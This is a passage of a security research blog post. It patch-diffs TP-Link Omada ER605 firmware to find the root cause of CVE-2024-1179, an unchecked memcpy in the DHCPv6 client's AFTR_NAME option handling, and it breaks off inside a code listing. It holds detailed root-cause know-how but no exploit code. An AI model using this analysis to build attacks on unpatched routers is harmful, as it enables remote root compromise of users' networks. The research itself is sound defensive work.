<strong>AFFECTED VENDORS</strong>: TP-Link</p><p><strong>AFFECTED PRODUCTS</strong>: <a href=https://www.tp-link.com/us/business-networking/omada-sdn-router/er605/>Omada ER605</a></p><p><strong>VULNERABILITY DETAILS</strong> :This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability.</p><p>The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.</p><p><strong>ADDITIONAL DETAILS</strong> : Fixed in firmware: ER605(UN)_V2_2.2.4 Build 20240119</p></blockquote><p>Also on the <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-1179>Nist Website</a>, we get some valuable information about the vulnerability.</p><blockquote><p>[!note]- NIST CVE-2024-1179 Detail
<strong>Description</strong>: TP-Link Omada ER605 DHCPv6 Client Options Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-22420.</p></blockquote><p>Since we have information about the fixed version, we can start a patch diff process to begin our analysis.</p><h3 id=patch-diffing>Patch diffing<a href=#patch-diffing class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><h4 id=retrieve-binaries>Retrieve binaries<a href=#retrieve-binaries class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4><p>The advisory published gives us a valuable information about the component affected by this bug. It is the DHCPv6 client of the router. We also know from the advisory that the bug was fixed in the firmware version <code>ER605(UN)_V2_2.2.4 Build 20240119</code>. With all this information in hand, we can start the patch diffing process.</p><p>Since we want to do a patch diffing, we will need both the vulnerable and patched DHCPv6 client binaries. We just googled the patched firmware version <code>ER605(UN)_V2_2.2.4 Build 20240119</code> and we found a link that talks about the official release of this version:
<a href=https://community.tp-link.com/en/business/forum/topic/653062>https://community.tp-link.com/en/business/forum/topic/653062</a>
On this website we also found a link to download the firmware:
<a href=https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip>https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip</a></p><p>The website also mentioned the exact name of the previous firmware version:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019111507.png><figcaption><h4></h4></figcaption></figure><p>So we just googled <code>ER605(UN)_V2_2.2.3 Build 20231201</code> and found the link to download it too:
<a href=https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip>https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip</a></p><p>The downloaded zip archives contain a license and <code>.bin</code> file which is probably the firmware.
Using <code>binwalk</code>, we found that there is a Squashfs file system in the <code>.bin</code> file.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092317.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092601.png><figcaption><h4></h4></figcaption></figure><p>We then extract them using the <code>binwalk -e</code> options.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092643.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016092859.png><figcaption><h4></h4></figcaption></figure><p>We can navigate to the directory containing the file system:s</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019112718.png><figcaption><h4></h4></figcaption></figure><p>After retrieving the Squashfs file system for both firmware versions, we can now search for the DHCPv6 client binaries and retrieve both the vulnerable and patched versions. The binary can be found in <code>/usr/sbin/dhcp6c</code> on both firmwares. We notice that the binary is a <code>ELF 32-bit</code>, running on <code>MIPS32 version 1</code> architecture. The loader is located at <code>/lib/ld-musl-mipsel-sf.so.1</code>. So the architecture is <code>MIPSEL32</code> (<code>MIPS32</code> endianness little).</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241101112929.png><figcaption><h4></h4></figcaption></figure><h4 id=comparison>Comparison<a href=#comparison class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4><p>To compare the two binaries, we will first use <strong>BinDiff</strong>. Since we don&rsquo;t have an IDAPro, we are going to use Ghidra to export our binaries and load them to BinDiff. This <a href=https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/>blog post</a> explains how to to do this.
The result looks like this:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019131603.png><figcaption><h4></h4></figcaption></figure><p>We can see on the similarity column that 4 functions have changed: <code>sub_405F08</code>, <code>sub_40C66C</code>, <code>sub_40C3B0</code> and <code>sub_402D74</code>. For example for the <code>sub_405F08</code> function, we can see changes to some basics blocs marked with blue color and some new basics blocs added in the patched version (right side), marked with red color.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241019150644.png><figcaption><h4></h4></figcaption></figure><p>Then, we use another tool <a href=https://github.com/clearbluejar/ghidriff><code>ghidriffs</code></a> which does some recapitulation and shows differences but between decompiled code, much more readable than assembly code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo docker run -it --rm -v <span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>/ghidriffs:/ghidriffs ghcr.io/clearbluejar/ghidriff:latest  ghidriffs/dhcp6c_3 ghidriffs/dhcp6c_4
</span></span></code></pre></div><p>The recap file generated by <code>ghidriffs</code> is also attached with the paper.
We can start by inspecting which strings are added to the new version.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241020154918.png><figcaption><h4></h4></figcaption></figure><p>We can see that two strings have been added to the patched version. They are both related to the <code>DHCP6_AFTRNAME</code> options. Remember from advisory that the flaw exists within the handling of DHCP options, and <code>AFTR_NAME</code> is one of the <a href=https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml#dhcpv6-parameters-2>DHCPv6 options</a>. So <code>sub_405F08</code> is probably one of the vulnerable functions we are looking for (if there are many). Additionally, if we take a look at where these new strings were added, we can see a call to the <code>memcpy</code> function (which is a dangerous function that could lead to buffer overflow if the bounds are not correctly checked) and a check added around this function on the patched version. Also some strings explicitly mentioned <code>malformed DHCP option</code> or <code>dhcp6_get_options</code>, and we can assume that this function is the one that handle DHCPv6 options. So no doubt, this is one of the vulnerable functions we are looking for.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022164538.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022164055.png><figcaption><h4></h4></figcaption></figure><p>Let&rsquo;s quickly analyze the other functions we have identified earlier with BinDiff. <code>ghiddriffs</code> shows us that the functions <code>sub_40C66C</code> and <code>sub_402D74</code> are never called. We can ignore them then.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241020163942.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241020164121.png><figcaption><h4></h4></figcaption></figure><p>For the function <code>sub_40C3B0</code>, we can see that it&rsquo;s called by the one function. Furthermore, a call to <code>strcpy</code> is replaced by <code>strncpy</code> in the patched version, so we might first think that this function is potentially vulnerable to a buffer overflow and there is something to do with it.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022102245.png><figcaption><h4></h4></figcaption></figure><p>To be sure whether or not this function is concerned by the advisory, we need to look more closely. First, we didn&rsquo;t identify any strings in the decompiled code of this function. Second, we cross-referenced this function and its caller and found that it is related to address updating.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022171151.png><figcaption><h4></h4></figcaption></figure><p>We conclude that this function is not related to the advisory.</p><p>The vulnerable function is then the function <code>sub_405F08</code>.</p><h3 id=root-cause-analysis>Root Cause Analysis<a href=#root-cause-analysis class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><h4 id=static-analysis>Static analysis<a href=#static-analysis class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4><p>As we identified earlier, the vulnerable function is <code>sub_405F08</code>. We check some of the strings in the binary against open source libraries (strings like <code>dhcp6_get_otions: unsupported authentication protocol</code>). This can make a reverse engineering process much easier. We discovered the <a href=https://github.com/opnsense/dhcp6c>OPNsense project</a> github repository. After taking a close look at this project, we found that it has a lot in common with the binary we are reversing, although there are some differences. For example, there are a lot of similarities (we will confirm this later) between the <code>sub_405F08</code> and the <a href=https://github.com/opnsense/dhcp6c/blob/94c633227403aa02e86260943b08803f2ece4657/common.c#L1569><code>dhcp6_get_options</code> function</a>. We can use this repo as baseline for our analysis. Let&rsquo;s revisit the diff from <code>ghiddrifs</code> :</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022201840.png><figcaption><h4></h4></figcaption></figure><p>We can see that there is a large <code>switch (case)</code>, which does some actions on each case. From picture above, we can see that the vulnerability exists in <code>case 0x40</code>. In comparison with the <a href=https://github.com/opnsense/dhcp6c/blob/94c633227403aa02e86260943b08803f2ece4657/common.c#L1569><code>dhcp6_get_options</code> function</a>, there is also a <code>switch(case)</code> where each case is a DHCPv6 options (like <code>DH6OPT_IA_NA</code>, <code>DH6OPT_IA_NA</code>, etc).
An in depth analysis shows that this function handles any DHCPv6 options received in the first argument. Indeed, as we can see below, we can easily spot that <code>p</code> is the pointer to the beginning of many <code>dhcp6opt</code> elements. In the for loop, we can see that the function gets the current <code>dhcp6opt</code> element (the <code>cp</code> pointer) and the next <code>dhcp6opt</code> element based on <code>p</code>(the <code>np</code> pointer). And <code>np</code>(next pointer) is used for the next iteration.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> dhcp6opt {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint16_t</span> dh6opt_type;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint16_t</span> dh6opt_len;
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* type-dependent data follows */</span>
</span></span><span style=display:flex><span>} <span style=color:#a6e22e>__attribute__</span> ((__packed__));
</span></span></code></pre></div><p>c
The pointer is then used to get the option type and handle it accordingly using the switch case.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030015951.png><figcaption><h4></h4></figcaption></figure><p>As we know that this project shares a lot of similarities with the binary we are reversing, we can assume that like the function <code>dhcp6_get_options</code> functions , the <code>sub_405f08</code> function also handles each DHCPv6 options received in first argument.</p><p>From the advisory, we know that the vulnerability exists for the <code>AFTR_NAME</code> options, but we have not found such option in the <code>dhcp6_get_options</code> function.
However, from here <a href=https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml>https://www.iana.org/assignments/dhcpv6-parameters/dhcpv6-parameters.xhtml</a>, we found that value <code>0x40=64</code> is for <code>AFTR_NAME</code>.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022202737.png><figcaption><h4></h4></figcaption></figure><p>We can now assume that the OPNsense is used as the baseline and the <code>AFTR_NAME</code> options has been added to support this options. So case <code>0x40=64</code> corresponds to <code>AFTR_NAME</code> options and was added by TP Link to support <code>AFTR_NAME option</code>.</p><p>But wait, what is a DHCPv6 option ?</p><p>According to <a href=https://datatracker.ietf.org/doc/html/rfc8415#section-21>RFC 8415</a>:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029235736.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029235712.png><figcaption><h4></h4></figcaption></figure><p>Thus, DHCPv6 options are parameters that provide additional configuration information to IPv6 clients beyond just IP addresses. Some options are:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030000200.png><figcaption><h4></h4></figcaption></figure><p>And <code>AFTR_NAME</code> is one of the options that is used for Dual-Stack Lite. <code>AFTR</code> stands for Address Family Transition Router&rsquo;s and according to <a href=https://datatracker.ietf.org/doc/html/rfc6334>RFC 6334</a>:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030001213.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030001230.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030001321.png><figcaption><h4></h4></figcaption></figure><p>With all this information in hand, let&rsquo;s move on.</p><p>Now let&rsquo;s analyze the vulnerable part of the function. As we know from earlier analysis, a check was added around a call to <code>memcpy</code> in the patched version. Let&rsquo;s focus our analysis there.
So, let&rsquo;s assume that the overflow is certainly caused by the <code>memcpy</code> function and start our analysis from there.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>memcpy</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>int</span>)local_14 <span style=color:#f92672>+</span> local_20),(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>int</span>)piVar3 <span style=color:#f92672>+</span> (<span style=color:#66d9ef>int</span>)local_18),local_28);
</span></span></code></pre></div><p>The <strong>first argument</strong> of <code>memcpy</code> which is <code>local14</code> (the destination buffer) comes from the <strong>third parameter</strong> passed to the function.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241022204302.png><figcaption><h4></h4></figcaption></figure><p>The <strong>second argument</strong>, the source buffer which is <code>puVar9</code> comes from the the <strong>first parameter passed</strong> to the function. And the <strong>third argument</strong> (<code>local_28 = cVar1</code>) which is the byte size to copy from source to destination also comes from the <strong>first parameter</strong> passed to the function. We can also see that we can write multiples times with the destination growing up, until the <code>local_28</code> which is the size argument of <code>memcpy</code> is 0.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023100813.png><figcaption><h4></h4></figcaption></figure><p>As we know that this function is almost equivalent to <code>dhcp6_get_options</code> from OPNsense project, let&rsquo;s check its signature.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>dhcp6_get_options</span>(<span style=color:#66d9ef>struct</span> dhcp6opt <span style=color:#f92672>*</span>p, <span style=color:#66d9ef>struct</span> dhcp6opt <span style=color:#f92672>*</span>ep, <span style=color:#66d9ef>struct</span> dhcp6_optinfo <span style=color:#f92672>*</span>optinfo)
</span></span></code></pre></div><p>The first and third parameters of this function are respectively of type <code>dhcp6opt</code> and <code>dhcp6_optinfo</code> defined as below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> dhcp6opt {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint16_t</span> dh6opt_type;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint16_t</span> dh6opt_len;
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* type-dependent data follows */</span>
</span></span><span style=display:flex><span>} <span style=color:#a6e22e>__attribute__</span> ((__packed__));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> dhcp6_optinfo {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> duid clientID;	<span style=color:#75715e>/* DUID */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> duid serverID;	<span style=color:#75715e>/* DUID */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> rapidcommit;	<span style=color:#75715e>/* bool */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> pref;		<span style=color:#75715e>/* server preference */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int32_t</span> elapsed_time;	<span style=color:#75715e>/* elapsed time (from client to server only) */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int64_t</span> refreshtime;	<span style=color:#75715e>/* info refresh time for stateless options */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list iapd_list; <span style=color:#75715e>/* list of IA_PD */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list iana_list; <span style=color:#75715e>/* list of IA_NA */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list reqopt_list; <span style=color:#75715e>/* options in option request */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list stcode_list; <span style=color:#75715e>/* status code */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list sip_list; <span style=color:#75715e>/* SIP server list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list sipname_list; <span style=color:#75715e>/* SIP domain list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list dns_list; <span style=color:#75715e>/* DNS server list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list dnsname_list; <span style=color:#75715e>/* Domain Search list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list ntp_list; <span style=color:#75715e>/* NTP server list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list prefix_list; <span style=color:#75715e>/* prefix list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list nis_list; <span style=color:#75715e>/* NIS server list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list nisname_list; <span style=color:#75715e>/* NIS domain list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list nisp_list; <span style=color:#75715e>/* NIS+ server list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list nispname_list; <span style=color:#75715e>/* NIS+ domain list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list bcmcs_list; <span style=color:#75715e>/* BCMC server list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_list bcmcsname_list; <span style=color:#75715e>/* BCMC domain list */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> rawop_list rawops; <span style=color:#75715e>/* Raw option list */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_vbuf relay_msg; <span style=color:#75715e>/* relay message */</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>#define relaymsg_len relay_msg.dv_len
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define relaymsg_msg relay_msg.dv_buf
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_vbuf ifidopt; <span style=color:#75715e>/* Interface-id */</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>#define ifidopt_len ifidopt.dv_len
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define ifidopt_id ifidopt.dv_buf
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	u_int authflags;
</span></span><span style=display:flex><span>	<span style=color:#75715e>#define DHCP6OPT_AUTHFLAG_NOINFO	0x1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>int</span> authproto;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> authalgorithm;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> authrdm;
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* the followings are effective only when NOINFO is unset */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint64_t</span> authrd;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>union</span> {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>struct</span> {
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>uint32_t</span> keyid;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>struct</span> dhcp6_vbuf realm;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>int</span> offset; <span style=color:#75715e>/* offset to the HMAC field */</span>
</span></span><span style=display:flex><span>		} aiu_delayed;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>struct</span> {
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>int</span> type;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>int</span> offset; <span style=color:#75715e>/* offset to the HMAC field */</span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>char</span> val[<span style=color:#ae81ff>16</span>]; <span style=color:#75715e>/* key value */</span>
</span></span><span style=display:flex><span>		} aiu_reconfig;
</span></span><span style=display:flex><span>	} authinfo;
</span></span><span style=display:flex><span>	<span style=color:#75715e>#define delayedauth_keyid authinfo.aiu_delayed.keyid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define delayedauth_realmlen authinfo.aiu_delayed.realm.dv_len
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define delayedauth_realmval authinfo.aiu_delayed.realm.dv_buf
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define delayedauth_offset authinfo.aiu_delayed.offset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define reconfigauth_type authinfo.aiu_reconfig.type
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define reconfigauth_offset authinfo.aiu_reconfig.offset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>#define reconfigauth_val authinfo.aiu_reconfig.val
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>};
</span></span></code></pre></div><p>And based on the OPNsense project, our <code>memcpy</code> is almost equivalent to the following, except for the first and third argument.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030020409.png><figcaption><h4></h4></figcaption></figure><p>We can follow their syntax and our <code>memcpy</code> can be rewritten as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>memcpy</span>(optinfo_something,something_from_cp,something_from_cp_len);
</span></span></code></pre></div><p>It is now more clear. As <code>cp</code> is of the type <code>dhcp6opt</code> defined earlier, if we can control it, we can control how many bytes to write into <code>optinfo</code> and possibly overflow it because we can write multiple times we can write to <code>optinfo</code> and reach it ends. But from our earlier analysis, we know that <code>cp</code> is the pointer to the beginning of our <code>AFTR_NAME</code> options raw data and this pointer is obtained from the <code>p</code> passed as the first argument to <code>dhcp6_get_options</code>. So if we can control <code>p</code> which is the start of all options passed, we can control how many bytes to write into <code>optinfo</code>. And as the <code>memcpy</code> is in for-loop and the destination address grows by the number of bytes we wrote earlier, we can write many times until we reach the end of <code>optinfo</code> and possibly cause the overflow.</p><p>Let&rsquo;s find a way to control this parameter. But before that, we need to figure out how to reach this function. After digging around the OPNsense project, we found that the only place where the<code>dhcp6_get_options</code> function is called is in <a href=https://github.com/opnsense/dhcp6c/blob/94c633227403aa02e86260943b08803f2ece4657/dhcp6c.c#L1213><code>client6_recv</code> function</a>. This function handles the received packets. After some analysis of the code, we note that the received packet is used to construct <code>p</code> and <code>ep</code> that get passed to <code>dhcp6_get_options</code> function.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030022048.png><figcaption><h4></h4></figcaption></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>client6_recv</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> rbuf[BUFSIZ], cmsgbuf[BUFSIZ];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> msghdr mhdr;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> iovec iov;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> sockaddr_storage from;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_if <span style=color:#f92672>*</span>ifp;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6opt <span style=color:#f92672>*</span>p, <span style=color:#f92672>*</span>ep;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6_optinfo optinfo;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>ssize_t</span> len;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> dhcp6 <span style=color:#f92672>*</span>dh6;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> cmsghdr <span style=color:#f92672>*</span>cm;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> in6_pktinfo <span style=color:#f92672>*</span>pi <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>iov, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(iov));
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>mhdr, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(mhdr));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	iov.iov_base <span style=color:#f92672>=</span> (<span style=color:#66d9ef>caddr_t</span>)rbuf;
</span></span><span style=display:flex><span>	iov.iov_len <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(rbuf);
</span></span><span style=display:flex><span>	mhdr.msg_name <span style=color:#f92672>=</span> (<span style=color:#66d9ef>caddr_t</span>)<span style=color:#f92672>&amp;</span>from;
</span></span><span style=display:flex><span>	mhdr.msg_namelen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(from);
</span></span><span style=display:flex><span>	mhdr.msg_iov <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>iov;
</span></span><span style=display:flex><span>	mhdr.msg_iovlen <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	mhdr.msg_control <span style=color:#f92672>=</span> (<span style=color:#66d9ef>caddr_t</span>)cmsgbuf;
